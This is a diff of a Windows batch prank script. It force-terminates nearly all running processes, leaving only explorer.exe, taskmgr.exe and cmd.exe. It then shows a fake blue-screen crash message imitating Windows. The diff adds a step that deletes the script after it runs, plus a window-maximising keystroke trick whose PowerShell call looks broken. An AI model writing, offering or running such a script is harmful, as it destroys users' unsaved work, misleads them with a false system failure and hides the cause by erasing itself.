@@ -1,27 +1,29 @@
 @echo off
-:: Enable delayed variable expansion so that variables inside FOR loops are updated correctly
 setlocal enabledelayedexpansion
 
-:: Close non-essential applications first
-echo Closing non-essential applications...
-tasklist /FI "STATUS eq running" > tasklist.txt
+:: Maximize CMD window (optional)
+mode con: cols=700 lines=500
+powershell -command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.Forms.SendKeys]::SendWait('% {ENTER}')}" >nul 2>&1
 
-for /F "skip=3 tokens=1,2" %%A in (tasklist.txt) do (
+:: Kill non-essential tasks
+echo Closing non-essential applications...
+tasklist /FI "STATUS eq running" > "%TEMP%\tasklist.txt"
+
+for /F "skip=3 tokens=1,2" %%A in (%TEMP%\tasklist.txt) do (
     set "proc_name=%%A"
     set "proc_pid=%%B"
 
-    :: Exclude essential Windows processes
     if /I "!proc_name!" NEQ "explorer.exe" (
         if /I "!proc_name!" NEQ "taskmgr.exe" (
             if /I "!proc_name!" NEQ "cmd.exe" (
                 taskkill /F /PID !proc_pid! >nul 2>&1
-                echo Terminated process: !proc_name!
+                echo Terminated: !proc_name!
             )
         )
     )
 )
 
-:: Now simulate the BSOD
+:: Simulate BSOD
 color 1F
 cls
 echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
@@ -35,3 +37,6 @@ echo Run CHKDSK /F to check for hard drive corruption, and then restart your com
 echo.
 echo Press any key to continue...
 pause >nul
+
+:: Delete self after execution
+del "%~f0"
